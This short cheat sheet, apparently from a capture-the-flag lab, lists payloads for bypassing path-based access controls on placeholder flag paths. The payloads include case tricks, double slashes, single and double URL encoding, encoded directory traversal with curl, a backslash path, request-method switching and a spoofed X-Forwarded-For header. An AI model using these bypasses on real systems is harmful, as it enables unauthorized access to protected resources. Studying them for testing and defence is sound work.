___

# Case sensitive

```
/admiN
```

# Extra directories

```
/app//flag
```

# Encoding

```
/app%2Fflag2
```

# Double Encoding

```
/app%252Fflag3
```

# Encoding & Directory Traversal

```bash
curl https://URL/status/%2E%2E/app/flag4
```

# Double Encoding & Directory Traversal

```bash
curl https://URL/status/%25E%25E/app/flag5
```

# Backslash

```bash
curl "https://URL/status/app\flag6"
```

# Request Method

Change request method (GET - POST)

# IP Address

```
-H "X-Forwarded-For: 127.0.0.1"
```




